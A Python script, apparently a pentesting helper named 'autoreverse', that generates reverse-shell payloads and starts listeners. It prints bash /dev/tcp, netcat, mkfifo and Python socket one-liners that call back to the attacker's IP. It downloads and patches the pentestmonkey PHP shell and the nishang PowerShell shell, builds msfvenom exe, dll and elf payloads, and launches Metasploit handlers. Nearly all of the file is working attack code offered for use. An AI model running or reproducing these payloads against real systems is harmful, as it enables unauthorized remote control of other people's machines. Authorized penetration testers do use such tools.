#!/usr/bin/python3

from simple_colors import *
import os, argparse, socket

ap = argparse.ArgumentParser()

ap.add_argument('-I', '--interface', required=True, type=str, help='Select the network interface.')

ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')

ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf or python).')

ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (meterpreter): nc or msf (msf only works with .exe, .dll and .elf payloads).')

ap.add_argument('-a', '--architecture', required=False, type=str, help='Define the architecture of the machine: x64 or x86 (default value is x64, only needed with .exe, .dll and .elf payloads).')

args = ap.parse_args()

ActualPath = os.popen('pwd').read().replace('\n', '')

payload = args.payload.lower()

arch = str(args.architecture).lower()


try:
    int(args.port)
except:
    print(red('The port must be a number'))
    exit()

def Get_IP(NT = args.interface):
    return os.popen("ifconfig " + str(NT) + " | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')

def nc_list(port = args.port, payload = payload):
    if payload == 'exe' or payload == '.exe' or payload == 'dll' or payload == '.dll':
        os.system('rlwrap nc -lvnp ' + str(port))
    else:
        os.system('nc -lvnp ' + str(port))

def msf_list(IP = Get_IP(), PORT = args.port):
    print(blue('Setting up your listener in metasploit.\n'))
    print(green('Waiting to say I\'m in...\n'))
    command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + '; exploit" 2>/dev/null'
    if arch == 'x86' or arch == '86':
        command = command.replace('x64', 'x86')
    if payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll':
        os.system(command)
    else:
        os.system(command.replace('windows', 'linux'))

def message(file, ActualPath = ActualPath):
    print(blue(('Your payload ' + red(file) + blue(' is located in ') +  red(ActualPath) + blue(' and ready to upload.\n'))))

def Check_files(file):
    path = '/opt/autoreverse/'
    if os.path.exists(path) == False:
        os.system('mkdir ' + path)
    filelink = {
        'autoreverse.php': 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php',
        'autoreverse.ps1': 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'
    }
    if os.path.exists(path + file) == False:
        print('\nDownloading ' + blue(file) + ' in ' + path + '\n')
        os.system('wget ' + filelink[file] + ' -O ' + path + file + ' 2>/dev/null')
        print(blue(file) + green(' downloaded.\n'))

def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, sys='64'):
    if payload.isnumeric():
        print(red('The payload must be a string.'))
        exit()
    
    msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + str(IP) + ' LPORT=' + str(PORT) + ' -f exe > autoreverse.exe 2>/dev/null'

    if msf == True:
        msfvenom = msfvenom.replace('shell_', 'meterpreter/')
    if sys == 'x86' or sys == '86':
        msfvenom = msfvenom.replace('x64', 'x86')

    if payload == 'oldnc':
        print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f\n'))
    elif payload == 'bash':
        print(blue('\nYour payload is:\n\n') + red('bash -i >& /dev/tcp/' + IP + '/' + PORT + ' 0>&1\n'))
    elif payload == 'nc':
        print(blue('\nYour payload is:\n\n') + red('nc -e /bin/sh ' + IP + ' ' + PORT + '\n'))
    elif payload == 'python' or payload == '.py':
        print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"))
    elif payload == 'php' or payload == '.php':
        file = 'autoreverse.php'
        Check_files(file)
        os.system('cp /opt/autoreverse/autoreverse.php .')
        with open('autoreverse.php', 'r') as archivo:
            data = archivo.readlines()
        with open('autoreverse.php', 'w') as archivo:
            data[48] = "$ip = '" + IP + "';\n"
            data[49] = "$port = " + PORT + ";\n"
            archivo.writelines(data)
        message(file)
    elif payload == 'elf' or payload == '.elf':
        file = 'autoreverse.elf'
        print(blue('Creating the payload, please wait.\n'))
        msfvenom = msfvenom.replace('windows', 'linux').replace('exe', 'elf')
        os.system(msfvenom)
        message(file)
    elif payload == 'powershell' or payload == 'ps1' or payload == '.ps1':
        file = 'autoreverse.ps1'
        Check_files(file)
        os.system('cp /opt/autoreverse/autoreverse.ps1 .')
        os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
        message(file)
    elif payload == 'exe' or payload == '.exe':
        file = 'autoreverse.exe'
        print(blue('Creating the payload, please wait.\n'))
        os.system(msfvenom)
        message(file)
    elif payload == 'dll' or payload == '.dll':
        file = 'autoreverse.dll'
        print(blue('Creating the payload, please wait.\n'))
        os.system(msfvenom.replace('exe', 'dll'))
        message(file)
    else:
        print(red('You payload option is not in the list, use "--help" to know the payloads list.'))
        exit()

if args.listener != None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if s.connect_ex(('127.0.0.1', int(args.port))) == 0:
        print(red('The port is already in use.'))
        exit()
    if args.listener == 'nc' or args.listener == 'netcat':
        Configure()
        print(green('Waiting to say I\'m in...\n'))
        nc_list()
        exit()
    elif args.listener == 'msf' or args.listener == 'metasploit':
        Configure(msf = True)
        msf_list()
        exit()
    else:
        print(red('Your listener option is not in the list, use "--help" to know the listeners list.'))
        exit()

if os.path.exists('/usr/local/bin/autoreverse.py') == False:
    os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')

Configure()
